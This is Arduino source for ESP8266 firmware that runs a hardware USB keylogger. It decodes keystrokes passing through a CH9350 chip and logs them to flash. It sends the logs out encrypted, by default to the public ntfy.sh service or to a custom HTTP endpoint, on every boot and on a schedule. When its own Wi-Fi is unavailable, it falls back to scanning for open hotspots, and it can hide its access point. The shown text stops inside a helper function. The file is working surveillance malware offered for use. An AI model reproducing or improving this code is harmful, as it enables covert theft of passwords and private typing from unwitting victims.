/************************************** INFO ***********************************
* File Name         : USBkeylogger.ino
* Author            : PushEAX
* Version           : V1.3.1
* Date              : 2022-11-13
* Last Modified     : 2025-06-04
* Description       : USBKeylogger V1/V2 Firmware
* 1. Serial read CH9350 messages, parse key value data
* 2. LittleFS
* 3. Web interface
* 4. AES-128-CBC encrypted push via ntfy.sh or custom HTTP endpoint
* 5. Boot push & scheduled push
* 6. Open hotspot auto-scan fallback when STA push fails
* 7. NTP time sync with configurable server and timezone offset
* 8. OTA firmware upgrade
*******************************************************************************/
#include <FS.h>
#include <LittleFS.h>
#include <ESP8266WiFi.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <ESPAsyncDNSServer.h>
#include <ESP8266HTTPClient.h>
#include <Updater.h>
#include <bearssl/bearssl.h>
#include <time.h>
#include "html.h"
#include "favicon.h"

// Slot path buffer: "/keyLog.99.txt\0" = 16 chars; 20 gives headroom if
// LOG_SLOT_COUNT is ever increased past 9 slots.
#define SLOT_PATH_SIZE 20

// =======Config=======
const char* Version = "1.3.1";
const char* versionFile_Path = "/fw_ver.txt";  // persisted firmware version for upgrade detection
const char* logFile_Path = "/keyLog.txt";        // active log (slot 0)
const char* configFile_Path = "/config.json";
const char* STA_SSID_DEFAULT = "Your_Router_SSID";
// Ring of N rotation slots. Slot 0 is the active file (logFile_Path);
// slots 1..N-1 are older snapshots, /keyLog.<n>.txt. Each rotation drops
// only the oldest slot (1/N of total log capacity) instead of half.
const int LOG_SLOT_COUNT = 8;
IPAddress IPAddr(192, 168, 5, 1);
IPAddress subnet(255, 255, 255, 0);
AsyncWebServer webServer(80); // Web server bound to port 80

struct Config {
  String AP_SSID = "USBKeylogger";
  String AP_password = "12345678";
  String AP_hidssid = "0";
  String STA_SSID = STA_SSID_DEFAULT;
  String STA_password = "Your_Router_Password";
  String push_mode = "0";              // 0=off, 1=ntfy.sh, 2=Custom HTTP
  String ntfy_topic = "";              // ntfy.sh topic (auto-generated on first boot)
  String ntfy_server = "http://ntfy.sh";  // ntfy server URL (default public, HTTP only)
  String push_url = "";                // Custom HTTP endpoint
  String push_token = "";              // Custom HTTP Bearer token
  String push_key = "";                // AES-128 encryption key (hex, auto-generated)
  String wifi_probe = "0";            // "1" = auto-probe open hotspots when STA push fails
  String tz_offset = "0";             // timezone offset in hours from UTC (e.g. "8" = UTC+8, "-5" = UTC-5)
  String push_boot = "1";             // "1" = push all logs on boot
  String push_interval = "0";         // push interval in minutes, 0 = disabled
  String ntp_server = "pool.ntp.org"; // NTP server for time sync
  String web_password = "";           // HTTP Basic Auth password, empty = disabled
};
Config cfg;
bool STA_configured = false;

unsigned long lastReconnectAttempt = 0;
const long reconnectInterval = 60000;     // 60s Wi-Fi STA Reconnect Interval
unsigned long lastFlushTime = 0;
const long flushInterval = 5000;          // 5s log flush
unsigned long lastRotationCheck = 0;
const long rotationCheckInterval = 30000; // 30s log size check
size_t maxActiveLogSize = 32 * 1024;      // per-slot cap; recomputed at boot from SPIFFS size
const size_t minReservedBytes = 16 * 1024;// keep at least this much free for config + FS overhead
unsigned long lastSerialByteAt = 0;
unsigned long lastLogWriteAt = 0;
const unsigned long logQuietBeforePush = 800; // avoid blocking CH9350 parsing while real key text is being written
bool push_configured = false;
bool ntpSynced = false;       // true once a valid NTP timestamp has been logged
bool ntpConfigured = false;   // true once configTime() has been called
bool logRotationBusy = false; // guard against concurrent SPIFFS access during rotation
bool bootRecoveryWindow = true;           // factory reset without auth during first 120s
bool pushPending = true;                  // cleared after boot push completes
// Push-test deferred execution: the /pushTest handler runs inside an AsyncTCP
// lwIP callback where blocking outbound TCP is impossible.  The handler only
// sets pushTestPending; loop() picks it up and calls sendPushTestPayload()
// from the safe main-loop context, then signals pushTestDone.
bool pushTestPending = false;
bool pushTestDone    = false;
uint8_t pushSlot = 0;                     // log slot currently being pushed
size_t pushOffset = 0;                    // bytes already pushed from pushSlot
const char* pushStatePath = "/pushOfs.txt";
const char* probeSavedPath = "/probeSSID.txt";
const uint8_t PROBE_IDLE        = 0;
const uint8_t PROBE_SCANNING    = 1;
const uint8_t PROBE_CONNECTING  = 2;
const uint8_t PROBE_SAVED_TRY   = 3;
uint8_t       probePhase    = PROBE_IDLE;
int           probeNetIdx   = 0;
int           probeNetCount = 0;
unsigned long probePhaseAt  = 0;
unsigned long probeLastAt   = 0;
const unsigned long PROBE_INIT_MS  = 60000UL;
const unsigned long PROBE_RETRY_MS = 10UL*60*1000;
const unsigned long PROBE_SCAN_MS  = 15000UL;
const unsigned long PROBE_CONN_MS  = 12000UL;
unsigned long nextPushAttemptAt = 0;
const unsigned long pushRetryInterval = 60000;
unsigned long lastScheduledPushAt = 0;
String pushLastResult = "Pending";
int pushLastHttpCode = 0;
String pushLastFailureReason = "";
String pushLastWifiSSID = "";
bool pushLastDeliveryOK = false;
String pushSessionID;                     // random hex tag per boot — groups all push messages
uint16_t pushSeqNum = 0;                  // sequence number within the session

// =======Config=======

FSInfo fsInfo;
File logFile;
bool rebootFlag = false;
bool logDirty = false;
bool otaSuccess = false;
uint8_t otaLastError = UPDATE_ERROR_OK;
size_t otaWritten = 0;
size_t otaUploaded = 0;
size_t otaMaxPayload = 0;
uint8_t CH9350HidData[8] = {0};
uint8_t CH9350HidData_Old[8] = {0};
char keyValue[128] = "";
bool capslock = false;

// CH9350 frame parser state machine
enum ParserState {
  WAIT_SYNC1,   // expect 0x57
  WAIT_SYNC2,   // expect 0xAB
  WAIT_CMD,     // expect keyboard uplink command
  WAIT_LEN,     // consume length byte
  READ_PAYLOAD  // read and validate the complete CH9350 payload
};
ParserState parserState = WAIT_SYNC1;
uint8_t frameLen = 0;
uint8_t frameIndex = 0;
uint8_t framePayload[16] = {0};
uint8_t pendingHidData[8] = {0};
unsigned long droppedHidFrames = 0;
unsigned long droppedChecksumFrames = 0;

AsyncDNSServer dnsServer;

enum PushResult {
  PUSH_DONE,
  PUSH_MORE,
  PUSH_ERROR
};
PushResult pushOneChunk();
void savePushState();
void processHIDFrame();
bool hidReportLooksValid(const uint8_t* report);
String templateProcessor(const String& var);
void runOpenWifiProbe();

static inline bool isLogAscii(uint8_t b) {
  return b == '\n' || b == '\r' || b == '\t' || (b >= 0x20 && b <= 0x7E);
}

static inline size_t sanitizeLogBytes(uint8_t* data, size_t len) {
  size_t out = 0;
  for (size_t i = 0; i < len; i++) {
    if (isLogAscii(data[i])) data[out++] = data[i];
  }
  return out;
}

// Return the configured timezone offset in seconds.
static long tzOffsetSeconds() {
  return atol(cfg.tz_offset.c_str()) * 3600L;
}

// Format the UTC-offset label for log timestamps, e.g. "UTC", "UTC+8", "UTC-5".
static void tzLabel(char* buf, size_t bufSize) {
  long h = atol(cfg.tz_offset.c_str());
  if (h == 0)      snprintf(buf, bufSize, "UTC");
  else if (h > 0)  snprintf(buf, bufSize, "UTC+%ld", h);
  else             snprintf(buf, bufSize, "UTC%ld", h);  // negative sign included
}

void writeAsciiLog(const char* text) {
  char clean[128];
  size_t out = 0;
  while (*text) {
    uint8_t b = (uint8_t)*text++;
    if (isLogAscii(b) && out + 1 < sizeof(clean)) {
      clean[out++] = (char)b;
    }
  }
  if (out == 0) return;
  logFile.write((const uint8_t*)clean, out);
  lastLogWriteAt = millis();
}

uint32_t readHardwareRandom() {
  return *((volatile uint32_t*)0x3FF20E44) ^ micros() ^ ESP.getCycleCount();
}

String randomHex(size_t bytes) {
  const char* hex = "0123456789abcdef";
  String out;
  out.reserve(bytes * 2);
  uint32_t rnd = 0;
  for (size_t i = 0; i < bytes; i++) {
    if ((i & 3) == 0) rnd = readHardwareRandom();
    uint8_t b = (rnd >> ((i & 3) * 8)) & 0xFF;
    out += hex[b >> 4];
    out += hex[b & 0x0F];
  }
  return out;
}

String normalizeConfigString(String value) {
  value.trim();
  String lower = value;
  lower.toLowerCase();
  if (lower == "null" || lower == "undefined") return "";
  return value;
}

String forceHttpUrl(String value) {
  value = normalizeConfigString(value);
  if (value.startsWith("https://")) {
    value = "http://" + value.substring(8);
  }
  return value;
}

bool applyGeneratedPushDefaults(const String& uniqueID) {
  bool changed = false;
  cfg.ntfy_topic = normalizeConfigString(cfg.ntfy_topic);
  String ntfyServer = forceHttpUrl(cfg.ntfy_server);
  if (ntfyServer.length() == 0) ntfyServer = "http://ntfy.sh";
  if (ntfyServer != cfg.ntfy_server) {
    cfg.ntfy_server = ntfyServer;
    changed = true;
  }
  String pushUrl = forceHttpUrl(cfg.push_url);
  if (pushUrl != cfg.push_url) {
    cfg.push_url = pushUrl;
    changed = true;
  }
  cfg.push_token = normalizeConfigString(cfg.push_token);
  cfg.push_key = normalizeConfigString(cfg.push_key);
  String lowerID = uniqueID;
  lowerID.toLowerCase();
  String legacyTopic = "keylog-" + lowerID;
  if (cfg.ntfy_topic.length() == 0 || cfg.ntfy_topic == legacyTopic) {
    cfg.ntfy_topic = legacyTopic + "-" + randomHex(12);
    changed = true;
  }
  if (cfg.push_key.length() == 0) {
    cfg.push_key = randomHex(16);
    changed = true;
  }
  return changed;
}

bool currentPushConfigured() {
  return (cfg.push_mode == "1" && cfg.ntfy_topic.length() > 0)
      || (cfg.push_mode == "2" && cfg.push_url.length() > 0);
}

String currentUniqueID() {
  String mac = WiFi.macAddress();
  mac.replace(":", "");
  return mac.substring(6);
}

void writeJsonEscaped(File& file, const String& value) {
  for (size_t i = 0; i < value.length(); i++) {
    char c = value[i];
    if (c == '"' || c == '\\') {
      file.write('\\');
      file.write(c);
    } else if (c == '\n') {
      file.print("\\n");
    } else if (c == '\r') {
      file.print("\\r");
    } else if (c == '\t') {
      file.print("\\t");
    } else if ((uint8_t)c >= 0x20) {
      file.write(c);
    }
  }
}

void writeJsonField(File& file, const char* key, const String& value, bool comma) {
  if (comma) file.write(',');
  file.write('"');
  file.print(key);
  file.print("\":\"");
  writeJsonEscaped(file, value);
  file.write('"');
}

bool readJsonString(const String& json, const char* key, String& out) {
  String needle = "\"";
  needle += key;
  needle += "\"";
  int pos = json.indexOf(needle);
  if (pos < 0) return false;
  pos = json.indexOf(':', pos + needle.length());
  if (pos < 0) return false;
  pos++;
  while (pos < (int)json.length() &&
         (json[pos] == ' ' || json[pos] == '\n' || json[pos] == '\r' || json[pos] == '\t')) pos++;
  if (pos >= (int)json.length() || json[pos] != '"') return false;
  pos++;
  out = "";
  while (pos < (int)json.length()) {
    char c = json[pos++];
    if (c == '"') return true;
    if (c == '\\' && pos < (int)json.length()) {
      char e = json[pos++];
      if      (e == 'n') out += '\n';
      else if (e == 'r') out += '\r';
      else if (e == 't') out += '\t';
      else if (e == 'b' || e == 'f') { /* discard */ }
      else if (e == 'u') {
        // Decode \uXXXX; only emit printable ASCII (U+0020..U+007E).
        int avail = (int)json.length() - pos;
        if (avail >= 4) {
          unsigned int cp = 0;
          bool ok = true;
          for (int k = 0; k < 4; k++) {
            char h = json[pos + k];
            if      (h >= '0' && h <= '9') cp = cp * 16 + (h - '0');
            else if (h >= 'a' && h <= 'f') cp = cp * 16 + (h - 'a' + 10);
            else if (h >= 'A' && h <= 'F') cp = cp * 16 + (h - 'A' + 10);
            else { ok = false; break; }
          }
          pos += 4;
          if (ok && cp >= 0x20 && cp <= 0x7E) out += (char)cp;
        }
      } else {
        out += e;
      }
    } else {
      out += c;
    }
  }
  return false;
}

bool loadConfigFile() {
  File configFile = LittleFS.open(configFile_Path, "r");
  if (!configFile) return false;
  if (configFile.size() > 4096) {
    configFile.close();
    return false;
  }
  String json;
  json.reserve(configFile.size() + 1);
  while (configFile.available()) json += (char)configFile.read();
  configFile.close();

  if (!readJsonString(json, "AP_SSID", cfg.AP_SSID) ||
      !readJsonString(json, "AP_password", cfg.AP_password) ||
      !readJsonString(json, "AP_hidssid", cfg.AP_hidssid) ||
      !readJsonString(json, "STA_SSID", cfg.STA_SSID) ||
      !readJsonString(json, "STA_password", cfg.STA_password)) {
    return false;
  }

  String value;
  if (readJsonString(json, "push_mode", value))    cfg.push_mode    = normalizeConfigString(value);
  if (readJsonString(json, "ntfy_topic", value))   cfg.ntfy_topic   = normalizeConfigString(value);
  if (readJsonString(json, "ntfy_server", value))  cfg.ntfy_server  = normalizeConfigString(value);
  if (readJsonString(json, "push_url", value))     cfg.push_url     = normalizeConfigString(value);
  if (readJsonString(json, "push_token", value))   cfg.push_token   = normalizeConfigString(value);
  if (readJsonString(json, "push_key", value))     cfg.push_key     = normalizeConfigString(value);
  if (readJsonString(json, "wifi_probe", value))   cfg.wifi_probe   = normalizeConfigString(value);
  if (readJsonString(json, "tz_offset", value))    cfg.tz_offset    = normalizeConfigString(value);
  if (readJsonString(json, "push_boot", value))    cfg.push_boot    = normalizeConfigString(value);
  if (readJsonString(json, "push_interval", value)) cfg.push_interval = normalizeConfigString(value);
  if (readJsonString(json, "ntp_server", value))   cfg.ntp_server   = normalizeConfigString(value);
  if (readJsonString(json, "web_password", value)) cfg.web_password = normalizeConfigString(value);
  return true;
}

bool writeConfigFile() {
  // Write to temp file first, then atomic rename.
  // If power fails mid-write, the old config.json is still intact.
  const char* tmpPath = "/config.tmp";
  File configFile = LittleFS.open(tmpPath, "w");
  if (!configFile) return false;
  configFile.write('{');
  writeJsonField(configFile, "AP_SSID", cfg.AP_SSID, false);
  writeJsonField(configFile, "AP_password", cfg.AP_password, true);
  writeJsonField(configFile, "AP_hidssid", cfg.AP_hidssid, true);
  writeJsonField(configFile, "STA_SSID", cfg.STA_SSID, true);
  writeJsonField(configFile, "STA_password", cfg.STA_password, true);
  writeJsonField(configFile, "push_mode", cfg.push_mode, true);
  writeJsonField(configFile, "ntfy_topic", cfg.ntfy_topic, true);
  writeJsonField(configFile, "ntfy_server", cfg.ntfy_server, true);
  writeJsonField(configFile, "push_url", cfg.push_url, true);
  writeJsonField(configFile, "push_token", cfg.push_token, true);
  writeJsonField(configFile, "push_key", cfg.push_key, true);
  writeJsonField(configFile, "wifi_probe", cfg.wifi_probe, true);
  writeJsonField(configFile, "tz_offset", cfg.tz_offset, true);
  writeJsonField(configFile, "push_boot", cfg.push_boot, true);
  writeJsonField(configFile, "push_interval", cfg.push_interval, true);
  writeJsonField(configFile, "ntp_server", cfg.ntp_server, true);
  writeJsonField(configFile, "web_password", cfg.web_password, true);
  configFile.write('}');
  configFile.close();
  // Atomic replace
  if (LittleFS.exists(configFile_Path)) LittleFS.remove(configFile_Path);
  return LittleFS.rename(tmpPath, configFile_Path);
}

void setup() {
  Serial.setRxBufferSize(512);
  Serial.begin(115200);
  Serial.setDebugOutput(false);
  if (!LittleFS.begin()) {
    delay(200);
    if (!LittleFS.begin()) {
      // Two mount attempts failed — likely SPIFFS→LittleFS migration or
      // genuinely corrupt FS. Format as last resort.
      LittleFS.format();
      LittleFS.begin();
    }
  }
  LittleFS.info(fsInfo);
  // Clean up stale temp file from interrupted config write
  if (LittleFS.exists("/config.tmp")) LittleFS.remove("/config.tmp");

  // ── Firmware version gate ────────────────────────────────────────────────
  // On first flash or upgrade from a different version, wipe all user data
  // (config, logs, push state) so the device starts fresh.  This prevents
  // stale config from a previous firmware layout causing unexpected behaviour.
  {
    bool versionMatch = false;
    if (LittleFS.exists(versionFile_Path)) {
      File vf = LittleFS.open(versionFile_Path, "r");
      if (vf) {
        String stored;
        stored.reserve(8);
        while (vf.available()) stored += (char)vf.read();
        vf.close();
        stored.trim();
        versionMatch = (stored == Version);
      }
    }
    if (!versionMatch) {
      // Wipe everything: config, push state, all log slots, legacy files
      if (LittleFS.exists(configFile_Path)) LittleFS.remove(configFile_Path);
      if (LittleFS.exists(pushStatePath))   LittleFS.remove(pushStatePath);
      char slotBuf[SLOT_PATH_SIZE];
      for (int s = 0; s < LOG_SLOT_COUNT; s++) {
        slotPath(s, slotBuf);
        if (LittleFS.exists(slotBuf)) LittleFS.remove(slotBuf);
      }
      if (LittleFS.exists("/keyLog.old.txt")) LittleFS.remove("/keyLog.old.txt");
      if (LittleFS.exists(probeSavedPath))   LittleFS.remove(probeSavedPath);
      // Write the current version so subsequent boots skip the wipe
      File vf = LittleFS.open(versionFile_Path, "w");
      if (vf) { vf.print(Version); vf.close(); }
    }
  }

  // Auto-size the log slots: reserve max(16KB, 5%) for config/FS overhead,
  // split the remainder evenly between LOG_SLOT_COUNT rotation slots.
  size_t reserved = fsInfo.totalBytes / 20;
  if (reserved < minReservedBytes) reserved = minReservedBytes;
  if (fsInfo.totalBytes > reserved) {
    maxActiveLogSize = (fsInfo.totalBytes - reserved) / LOG_SLOT_COUNT;
  }

  logFile = LittleFS.open(logFile_Path, "a+");
  logFile.print("\n\n== Boot ==\n");

  if (!LittleFS.exists(configFile_Path)){ // If the configuration file does not exist, write out the default cfg
    // Generate a unique SSID on the first boot
    String uniqueID = currentUniqueID(); // Get the last 6 characters of the MAC address
    cfg.AP_SSID += "_";
    cfg.AP_SSID += uniqueID;
    applyGeneratedPushDefaults(uniqueID);
    writeConfigFile();
  }
  else{ // If a configuration file exists, read it to override the default cfg
    if (loadConfigFile() || loadConfigFile()) {  // retry once on transient read error
      bool migrated = false;
      if (cfg.push_mode == "3" && cfg.push_url.length() > 0) {
        cfg.push_mode = "2"; // previous encrypted builds used mode 3 for Custom HTTP
        migrated = true;
      } else if (cfg.push_mode == "2" && cfg.push_url.length() == 0) {
        cfg.push_mode = "0";
        migrated = true;
      }
      migrated = applyGeneratedPushDefaults(currentUniqueID()) || migrated;
      if (migrated) writeConfigFile();
    }else{
      // Config file is corrupt (e.g. interrupted write). Fall back to
      // defaults instead of deleting and restarting, to avoid a boot loop.
      cfg = Config();
      String uniqueID = currentUniqueID();
      cfg.AP_SSID += "_";
      cfg.AP_SSID += uniqueID;
      applyGeneratedPushDefaults(uniqueID);
      writeConfigFile();
    }
  }
  STA_configured = (cfg.STA_SSID.length() > 0 && cfg.STA_SSID != STA_SSID_DEFAULT);
  push_configured = currentPushConfigured();
  pushLastResult = push_configured ? "Pending" : "Disabled";
  // Always push the FULL log on every boot so the receiver gets the complete
  // record.  Previous firmware used loadPushState() / normalizePushStateSlot()
  // which resumed from the saved offset — that caused "partial data" because
  // only new-since-last-push bytes were sent.  Starting from the oldest slot
  // at offset 0 guarantees the entire log is delivered.
  // After the boot push finishes the offset is saved normally; incremental
  // pushes triggered by new keystrokes (re-arm in flush) send only new data
  // until the next reboot.
  pushSlot = oldestExistingLogSlot();
  pushOffset = 0;
  savePushState();
  if (cfg.push_boot != "1") {
    pushPending = false;
    pushLastResult = push_configured ? "Waiting" : "Disabled";
  }
  lastScheduledPushAt = millis();
  pushSessionID = randomHex(4);   // 8-char hex tag for this boot cycle

  startWiFi();
  startWebInterface();
}

void loop() {
  if (rebootFlag) {
    logFile.print("\n");
    logFile.close();
    yield();
    delay(100);
    ESP.restart();
  }

  if (bootRecoveryWindow && millis() > 120000) bootRecoveryWindow = false;

  // Wi-Fi STA reconnect (suppress while probe is active — probeAbort restores STA)
  if (STA_configured && WiFi.status() != WL_CONNECTED && probePhase == PROBE_IDLE) {
    unsigned long currentMillis = millis();
    if (currentMillis - lastReconnectAttempt >= reconnectInterval) {
      lastReconnectAttempt = currentMillis;
      WiFi.reconnect();
    }
  }

  // CH9350 protocol parsing - always runs, regardless of Wi-Fi state
  processSerialBytes();

  // Periodic flush so recent keys survive sudden power loss
  if (logDirty && millis() - lastFlushTime >= flushInterval) {
    logFile.flush();
    logDirty = false;
    lastFlushTime = millis();
    // Push is boot-only: pushPending is set once in setup() and cleared
    // after PUSH_DONE.  New keystrokes during runtime are NOT pushed
    // until the next reboot.
  }

  // Periodic log rotation
  if (millis() - lastRotationCheck >= rotationCheckInterval) {
    lastRotationCheck = millis();
    rotateLogIfNeeded();
  }

  // NTP time sync: append timestamp after the "Boot" marker written in setup().
  if (!ntpSynced) {
    if (WiFi.status() == WL_CONNECTED) {
      if (!ntpConfigured) {
        configTime(0, 0, cfg.ntp_server.c_str(), "time.nist.gov", "time.cloudflare.com");
        ntpConfigured = true;
      }
      time_t now = time(nullptr);
      if (now > 1577836800UL) {
        time_t local = now + tzOffsetSeconds();
        struct tm t;
        gmtime_r(&local, &t);
        char tz[16];
        tzLabel(tz, sizeof(tz));
        char buf[64];
        snprintf(buf, sizeof(buf),
                 "== NTP: %04d-%02d-%02d %02d:%02d:%02d %s ==\n",
                 t.tm_year + 1900, t.tm_mon + 1, t.tm_mday,
                 t.tm_hour, t.tm_min, t.tm_sec, tz);
        writeAsciiLog(buf);
        logDirty = true;
        ntpSynced = true;
      }
    }
    if (!ntpSynced && millis() > 30000) {
      if (cfg.wifi_probe != "1" || !push_configured)
        ntpSynced = true;  // no internet path available, give up
    }
  }

  // Deferred push-test: /pushTest handler cannot call pushViaNtfy() directly
  // because it runs inside an AsyncTCP lwIP callback where blocking outbound
  // TCP deadlocks the stack.  The handler sets pushTestPending and returns
  // immediately; loop() runs the real test here and sets pushTestDone.
  if (pushTestPending && !pushTestDone) {
    sendPushTestPayload();
    pushTestDone    = true;
    pushTestPending = false;
  }

  // Open-WiFi auto-probe: when STA push is unavailable, scan open hotspots
  // and push through the first one that can reach the push server.
  runOpenWifiProbe();

  // Scheduled push: re-arm full push at the configured interval
  if (push_configured && !pushPending) {
    int intervalMin = atoi(cfg.push_interval.c_str());
    if (intervalMin > 0) {
      unsigned long intervalMs = (unsigned long)intervalMin * 60000UL;
      if (millis() - lastScheduledPushAt >= intervalMs) {
        resetPushStateForRepush();
        lastScheduledPushAt = millis();
      }
    }
  }

  // Streaming push: pushOneChunk() sends ALL log data in a single HTTP
  // request using streaming encryption (constant ~700 B RAM).  It always
  // returns PUSH_DONE on success; PUSH_MORE is kept for future extensibility.
  if (push_configured && pushPending) {
    unsigned long now = millis();
    if (WiFi.status() != WL_CONNECTED) {
      pushLastResult = "Waiting for STA Wi-Fi";
    } else if ((long)(now - nextPushAttemptAt) < 0) {
      unsigned long secondsLeft = (nextPushAttemptAt - now + 999) / 1000;
      pushLastResult = "Retry in " + String(secondsLeft) + "s";
    } else if (lastLogWriteAt != 0 && now - lastLogWriteAt < logQuietBeforePush) {
      pushLastResult = "Waiting for log idle";
    } else {
      PushResult r = pushOneChunk();
      if (r == PUSH_DONE) {
        pushPending = false;
        lastScheduledPushAt = millis();
      } else if (r == PUSH_MORE) {
        nextPushAttemptAt = 0;             // send next chunk on very next loop()
        // pushPending stays true so loop keeps going until PUSH_DONE
      } else if (r == PUSH_ERROR) {
        nextPushAttemptAt = now + pushRetryInterval;  // back-off, then retry
      }
    }
  }
}

void acceptPendingHIDFrame() {
  if (!hidReportLooksValid(pendingHidData)) {
    droppedHidFrames++;
    return;
  }
  memcpy(CH9350HidData_Old, CH9350HidData, sizeof(CH9350HidData));
  memcpy(CH9350HidData, pendingHidData, sizeof(CH9350HidData));
  processHIDFrame();
}

static uint8_t sumBytes(const uint8_t* data, uint8_t start, uint8_t endExclusive) {
  uint8_t sum = 0;
  for (uint8_t i = start; i < endExclusive; i++) sum += data[i];
  return sum;
}

bool acceptCh9350Payload() {
  const uint8_t* hid = nullptr;
  bool checksumOk = false;

  // Observed report-ID frame:
  // 57 AB 83 0C 12 01 [8-byte HID] SN SUM
  // SUM is RID + HID bytes + serial number, modulo 256.
  if (frameLen == 0x0C && framePayload[1] == 0x01) {
    hid = framePayload + 2;
    checksumOk = (sumBytes(framePayload, 1, 11) == framePayload[11]);
  }
  // Boot keyboard frame used by other CH9350 modes:
  // 57 AB 88 0B 10 [8-byte HID] SN SUM
  // SUM is HID bytes + serial number, modulo 256.
  else if (frameLen == 0x0B && framePayload[0] == 0x10) {
    hid = framePayload + 1;
    checksumOk = (sumBytes(framePayload, 1, 10) == framePayload[10]);
  }

  if (!hid) return false;
  if (!checksumOk) {
    droppedChecksumFrames++;
    return false;
  }
  memcpy(pendingHidData, hid, sizeof(pendingHidData));
  acceptPendingHIDFrame();
  return true;
}

// CH9350 Key Data Example: 57 AB 83 0C 12 01 00 00 04 00 00 00 00 00 12 17
// Non-blocking frame parser. It now validates the CH9350 checksum before a
// report can reach HID2ASCII; otherwise a single dropped UART byte can create
// a plausible-looking but corrupt HID report.
void processSerialBytes() {
  while (Serial.available() > 0) {
    uint8_t b = (uint8_t)Serial.read();
    lastSerialByteAt = millis();
    switch (parserState) {
      case WAIT_SYNC1:
        if (b == 0x57) parserState = WAIT_SYNC2;
        break;
      case WAIT_SYNC2:
        if (b == 0xAB)      parserState = WAIT_CMD;
        else if (b == 0x57) parserState = WAIT_SYNC2; // tolerate 57 57 AB
        else                parserState = WAIT_SYNC1;
        break;
      case WAIT_CMD:
        // 0x83 and 0x88 are both CH9350 keyboard data in common modes.
        if (b == 0x83 || b == 0x88) {
          parserState = WAIT_LEN;
        }
        else if (b == 0x57) parserState = WAIT_SYNC2;
        else                parserState = WAIT_SYNC1;
        break;
      case WAIT_LEN:
        // Keyboard payloads are 11 or 12 bytes in the documented CH9350 modes
        // this firmware supports. Longer values are ignored and re-synced.
        if (b >= 0x0B && b <= sizeof(framePayload)) {
          frameLen = b;
          frameIndex = 0;
          parserState = READ_PAYLOAD;
        } else if (b == 0x57) {
          parserState = WAIT_SYNC2;
        } else {
          parserState = WAIT_SYNC1;
        }
        break;
      case READ_PAYLOAD:
        framePayload[frameIndex++] = b;
        if (frameIndex >= frameLen) {
          acceptCh9350Payload();
          parserState = WAIT_SYNC1;
        }
        break;
    }
  }
}

void processHIDFrame() {
  // CapsLock rising-edge detection: only toggle when 0x39 appears in the new
  // frame but was absent in the previous one. Avoids multi-toggle on key hold.
  bool oldHasCaps = false, newHasCaps = false;
  for (int i = 2; i < 8; i++) {
    if (CH9350HidData_Old[i] == 0x39) oldHasCaps = true;
    if (CH9350HidData[i]     == 0x39) newHasCaps = true;
  }
  if (!oldHasCaps && newHasCaps) capslock = !capslock;

  keyValue[0] = '\0';
  HID2ASCII(CH9350HidData_Old, CH9350HidData, capslock, keyValue, sizeof(keyValue));
  if (keyValue[0] != '\0') {
    writeAsciiLog(keyValue);
    logDirty = true;
  }
}

// Slot 0 -> "/keyLog.txt", slot N -> "/keyLog.N.txt".
// Buf must be >= SLOT_PATH_SIZE bytes.
static void slotPath(int slot, char* buf) {
  if (slot == 0) strcpy(buf, "/keyLog.txt");
  else           snprintf(buf, SLOT_PATH_SIZE, "/keyLog.%d.txt", slot);
}

static size_t fileSizeOrZero(const char* path) {
  if (!LittleFS.exists(path)) return 0;
  File f = LittleFS.open(path, "r");
  if (!f) return 0;
  size_t s = f.size();
  f.close();
  return s;
}

// Shift slots down by one and re-open a fresh active log. Drops only the
// oldest slot (1/LOG_SLOT_COUNT of total log capacity).
void rotateLogIfNeeded() {
  File f = LittleFS.open(logFile_Path, "r");
  if (!f) return;
  size_t size = f.size();
  f.close();
  if (size < maxActiveLogSize) return;

  // Best-effort single chunk before rotation. Any remaining bytes continue
  // from the renamed slot after pushSlot is shifted below.
  if (push_configured && WiFi.status() == WL_CONNECTED &&
      (lastLogWriteAt == 0 || millis() - lastLogWriteAt >= logQuietBeforePush)) {
    pushOneChunk();
  }

  logRotationBusy = true;   // guard: prevent web-serve reads during rename
  logFile.close();

  // Drop oldest
  char path[SLOT_PATH_SIZE];
  slotPath(LOG_SLOT_COUNT - 1, path);
  if (LittleFS.exists(path)) LittleFS.remove(path);

  // Shift: slot N-2 -> N-1, ..., slot 1 -> 2, slot 0 -> 1
  char fromPath[SLOT_PATH_SIZE], toPath[SLOT_PATH_SIZE];
  for (int slot = LOG_SLOT_COUNT - 2; slot >= 0; slot--) {
    slotPath(slot, fromPath);
    slotPath(slot + 1, toPath);
    if (LittleFS.exists(fromPath)) LittleFS.rename(fromPath, toPath);
  }

  logFile = LittleFS.open(logFile_Path, "a+");
  logRotationBusy = false;
  logFile.print("==rotated==\n");
  logDirty = true;
  if (push_configured) {
    if (pushSlot < LOG_SLOT_COUNT - 1) {
      pushSlot++;
    } else {
      pushOffset = 0; // the tracked oldest slot was dropped
    }
    savePushState();
  }
}

// ==================== Log Push ====================

uint8_t oldestExistingLogSlot() {
  char path[SLOT_PATH_SIZE];
  for (int slot = LOG_SLOT_COUNT - 1; slot >= 0; slot--) {
    slotPath(slot, path);
    if (LittleFS.exists(path)) return (uint8_t)slot;
  }
  return 0;
}

void savePushState() {
  File f = LittleFS.open(pushStatePath, "w");
  if (f) {
    f.print(pushSlot);
    f.print(',');
    f.print(pushOffset);
    f.close();
  }
}

void resetPushStateForRepush() {
  pushSlot = oldestExistingLogSlot();
  pushOffset = 0;
  pushPending = true;
  nextPushAttemptAt = 0;
  pushLastResult = "Pending";
  pushLastHttpCode = 0;
  pushLastFailureReason = "";
  pushLastWifiSSID = "";
  pushLastDeliveryOK = false;
  probeLastAt = 0;
  savePushState();
}

String pushModeName() {
  if (cfg.push_mode == "1") return "ntfy.sh";
  if (cfg.push_mode == "2") return "Custom HTTP";
  return "Off";
}

String joinUrl(String base, const String& path) {
  base.trim();
  while (base.endsWith("/")) base.remove(base.length() - 1);
  return base + "/" + path;
}

String base64Encode(const uint8_t* data, size_t len) {
  static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  String out;
  out.reserve(((len + 2) / 3) * 4);

  for (size_t i = 0; i < len; i += 3) {
    uint32_t v = ((uint32_t)data[i]) << 16;
    if (i + 1 < len) v |= ((uint32_t)data[i + 1]) << 8;
    if (i + 2 < len) v |= data[i + 2];

    out += b64[(v >> 18) & 0x3F];
    out += b64[(v >> 12) & 0x3F];
    out += (i + 1 < len) ? b64[(v >> 6) & 0x3F] : '=';
    out += (i + 2 < len) ? b64[v & 0x3F] : '=';
  }
  return out;
}

// Decode one hex nibble. Returns 0 for invalid chars (safe default).
static inline uint8_t hexNibble(char c) {
  if (c >= '0' && c <= '9') return (uint8_t)(c - '0');
